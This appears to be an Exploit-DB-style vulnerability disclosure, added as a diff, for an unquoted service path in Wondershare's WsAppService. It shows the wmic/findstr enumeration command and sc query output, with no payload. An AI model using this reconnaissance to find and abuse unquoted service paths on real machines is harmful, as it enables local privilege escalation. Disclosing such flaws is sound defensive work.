@@ -1,0 +1,27 @@
+# Exploit Title: Wondershare Application Framework Service - "WsAppService"  Unquote Service Path
+# Google Dork: N/A
+# Date: 2019-11-11
+# Exploit Author: chuyreds
+# Vendor Homepage: https://www.wondershare.com/
+# Software Link: https://www.wondershare.com/drfone/
+# Version: 2.4.3.231
+# Tested on: Windows 10 Home Single Language
+# CVE : N/A
+
+#Service Info:
+
+C:\Users\user>wmic service get name, displayname, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+Wondershare Application Framework Service	WsAppService	C:\Program Files (x86)\Wondershare\WAF\2.4.3.231\WsAppService.exe	Auto
+
+
+C:\Users\user>sc query WsAppService
+
+NOMBRE_SERVICIO: WsAppService
+        TIPO               : 10  WIN32_OWN_PROCESS
+        ESTADO             : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        CÓD_SALIDA_WIN32   : 0  (0x0)
+        CÓD_SALIDA_SERVICIO: 0  (0x0)
+        PUNTO_COMPROB.     : 0x0
+        INDICACIÓN_INICIO  : 0x0
